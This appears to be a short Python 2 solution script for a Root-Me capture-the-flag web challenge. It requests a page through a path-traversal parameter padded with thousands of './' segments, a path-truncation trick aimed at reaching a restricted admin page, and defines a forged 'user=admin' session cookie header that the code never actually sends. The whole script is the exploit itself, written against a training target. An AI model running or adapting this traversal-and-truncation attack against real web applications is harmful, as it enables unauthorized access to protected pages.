import requests

url = "http://challenge01.root-me.org/web-serveur/ch35/index.php?page=a/../admin.html/"


s = requests.Session()


headers = {'Set-Cookie':'PHPSESSID=user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT;  path=/web-serveur/ch35/; httponly' }

path='./'*4060
url=url+path
r = s.get(url)


print r.headers
print r.text